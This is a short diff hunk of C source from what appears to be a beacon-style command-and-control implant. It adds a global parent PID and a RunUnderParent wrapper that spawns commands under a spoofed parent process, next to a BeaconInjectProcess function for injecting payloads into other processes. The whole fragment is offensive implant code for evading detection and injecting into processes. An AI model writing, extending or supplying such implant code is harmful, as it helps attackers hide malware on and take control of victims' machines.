@@ -1216,6 +1216,12 @@ BOOL RunUnder(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORM
 	return RunUnder_(&runUnderConfig, 0);
 }
 
+DWORD gParentPid;
+BOOL RunUnderParent(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_INFORMATION* processInfo, int creationFlags, BOOL ignoreToken)
+{
+	return RunUnder(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid);
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
